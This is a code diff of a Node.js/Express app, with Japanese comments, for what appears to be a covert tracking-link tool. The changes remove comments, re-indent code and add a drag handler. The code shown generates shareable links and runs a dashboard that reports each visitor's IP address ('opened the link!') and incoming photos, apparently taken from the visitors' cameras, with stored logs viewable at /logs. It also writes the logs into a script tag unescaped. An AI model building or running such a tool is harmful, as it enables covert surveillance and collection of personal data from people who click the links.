@@ -190,9 +190,6 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
     cmdOutput.scrollTop = cmdOutput.scrollHeight;
   }
 
-  // ============================================================
-  // ★ ページ読み込み時に過去のログを表示（修正ポイント1）
-  // ============================================================
   if (window._pastLogs && window._pastLogs.length > 0) {
     window._pastLogs.forEach(function(data) {
       addCmdOutput('[ACCESS] ' + data.ip + ' opened the link!', 'cmd-notify');
@@ -209,14 +206,10 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
     });
   }
 
-  // 写真の枚数表示
   if (window._photoCount && window._photoCount > 0) {
     addCmdOutput('[PHOTO] ' + window._photoCount + ' photos received (view at /logs)', 'cmd-photo');
   }
 
-  // ============================================================
-  // ソケット通信（新しいアクセスがあったら表示）
-  // ============================================================
   const socket = io();
   socket.on('new-log', function(data) {
     addCmdOutput('[ACCESS] ' + data.ip + ' opened the link!', 'cmd-notify');
@@ -250,9 +243,6 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
     addCmdOutput('[PHOTO] Image #' + photoCountNum + ' received', 'cmd-photo');
   });
 
-  // ============================================================
-  // コマンド処理
-  // ============================================================
   cmdInput.addEventListener('keydown', function(e) {
     if (e.key === 'Enter') {
       const cmd = cmdInput.value.trim();
@@ -338,9 +328,6 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
     }
   });
 
-  // ============================================================
-  // リンク生成
-  // ============================================================
   const generateBtn = document.getElementById('generate-btn');
   const copyBtn = document.getElementById('copy-btn');
   const resultArea = document.getElementById('result-area');
@@ -397,9 +384,6 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
     document.body.removeChild(textarea);
   }
 
-  // ============================================================
-  // ドラッグ＆リサイズ
-  // ============================================================
   function makeDraggable(wId, dId, rId) {
     const win = document.getElementById(wId);
     const drag = document.getElementById(dId);
@@ -437,6 +421,7 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
     function endResize() { resizeData = null; win.style.zIndex = ''; win.style.transition = ''; }
     resize.addEventListener('mousedown', function(e) { startResize(e.clientX, e.clientY); e.preventDefault(); e.stopPropagation(); });
     resize.addEventListener('touchstart', function(e) { var t = e.touches[0]; startResize(t.clientX, t.clientY); e.preventDefault(); e.stopPropagation(); }, { passive: false });
+    document.addEventListener('mousemove', function(e) { if (dragData) moveDrag(e.clientX, e.clientY); if (resizeData) moveResize(e.clientX, e.clientY); });
     document.addEventListener('mouseup', function() { if (dragData) endDrag(); if (resizeData) endResize(); });
     document.addEventListener('touchmove', function(e) { var t = e.touches[0]; if (dragData) moveDrag(t.clientX, t.clientY); if (resizeData) moveResize(t.clientX, t.clientY); e.preventDefault(); }, { passive: false });
     document.addEventListener('touchend', function() { if (dragData) endDrag(); if (resizeData) endResize(); });
@@ -470,16 +455,15 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
 // サーバー
 // ============================================================
 
-// ★ 修正ポイント2: / ルート（過去ログを埋め込む）
 app.get('/', (req, res) => {
   const pastLogs = logs.slice(-30);
-const logsJson = JSON.stringify(pastLogs);
-const photoCount = logs.filter(l => l.image).length || 0;
-const htmlWithData = HTML.replace(
-  '<!-- PAST_LOGS -->',
-  '<script>window._pastLogs = ' + logsJson + '; window._photoCount = ' + photoCount + ';</script>'
-);
-res.send(htmlWithData);
+  const logsJson = JSON.stringify(pastLogs);
+  const photoCount = logs.filter(l => l.image).length || 0;
+  const htmlWithData = HTML.replace(
+    '<!-- PAST_LOGS -->',
+    '<script>window._pastLogs = ' + logsJson + '; window._photoCount = ' + photoCount + ';</script>'
+  );
+  res.send(htmlWithData);
 });
 
 app.get('/generate', (req, res) => {
@@ -746,4 +730,4 @@ server.listen(PORT, function() {
   console.log('Server running on port ' + PORT);
   console.log('📂 ログファイル: ' + LOG_FILE);
   console.log('📊 現在のログ件数: ' + logs.length);
-});  
+});
